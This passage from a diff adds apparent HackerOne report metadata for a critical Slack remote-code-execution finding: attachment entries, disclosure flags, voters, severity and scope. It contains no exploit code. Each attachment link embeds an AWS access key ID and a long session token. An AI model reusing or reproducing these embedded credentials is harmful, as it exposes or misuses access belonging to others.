ehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=74a1d4bce5ae42d6e62417dc7aa3df8a99cdcfbc7667dbe4938410a8afe68bef",
+      "file_size": 161614,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 697019,
+      "file_name": "files.slack.com-xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uvMcWjkG1XpTHidY9M4Vo48o?response-content-disposition=attachment%3B%20filename%3D%22files.slack.com-xss.png%22%3B%20filename%2A%3DUTF-8%27%27files.slack.com-xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=56903785556158e3ed08779b23969e1d17c64ed5f9cc12c85698e6653e3f2a3a",
+      "file_size": 71621,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 697020,
+      "file_name": "slack-as-exploit-host.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hh1DiQBwThZPHP1Lh2ZGC27f?response-content-disposition=attachment%3B%20filename%3D%22slack-as-exploit-host.png%22%3B%20filename%2A%3DUTF-8%27%27slack-as-exploit-host.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=420f97ee82317f8808c801152d8fbf9cca92247893fcdc99f728c2f15186012d",
+      "file_size": 89227,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 697022,
+      "file_name": "slack-rce-demo.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ptrmic4W4q3ogKZf6Ds1Uxio?response-content-disposition=attachment%3B%20filename%3D%22slack-rce-demo.mov%22%3B%20filename%2A%3DUTF-8%27%27slack-rce-demo.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ac9f8b0b629ed8091794a44dad39cb63db2e07a0ae5c7711152c72fbc47de920",
+      "file_size": 1072770,
+      "type": "video/quicktime",
+      "moderated": null
+    },
+    {
+      "id": 697023,
+      "file_name": "token-xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zd5znpvxZFjQM9Axz5j76nLE?response-content-disposition=attachment%3B%20filename%3D%22token-xss.png%22%3B%20filename%2A%3DUTF-8%27%27token-xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T000629Z&X-Amz-Expires=1853&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bc434e91e8585d86f31b4c9f877e38df3ab8d2d22bd98a68be9a55417c294f4c",
+      "file_size": 38386,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-25T17:57:23.269Z",
+  "allow_singular_disclosure_after": -170575746.560759,
+  "singular_disclosure_allowed": true,
+  "vote_count": 504,
+  "voters": [
+    "pat_ventuzelo",
+    "daehee",
+    "vaktibabat",
+    "stardot",
+    "holsick",
+    "madinmars",
+    "orange303",
+    "0hmz",
+    "whitewhale-dmb",
+    "ivarsvids",
+    "and 494 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 38317,
+    "asset_type": "URL",
+    "asset_identifier": "app.slack.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
